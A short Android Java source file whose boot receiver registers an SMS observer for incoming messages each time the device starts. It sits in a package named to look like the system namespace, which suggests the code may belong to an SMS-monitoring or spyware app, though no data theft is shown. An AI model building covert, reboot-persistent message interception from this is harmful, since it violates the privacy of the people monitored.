package android.service.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;

public class OnBootReceiver extends BroadcastReceiver
{
    protected Handler handler = new Handler();

    @Override
    public void onReceive(Context context, Intent intent)
    {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()))
        {
            SmsObserver smsObserver = new SmsObserver(context, handler);
            IntentFilter smsFilter = new IntentFilter(Service.SMS_RECEIVED);

            ReceiverManager receiverManager = ReceiverManager.init(context);
            if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
            {
                receiverManager.registerReceiver(smsObserver.inSms, smsFilter, context);
            }
        }
    }

}
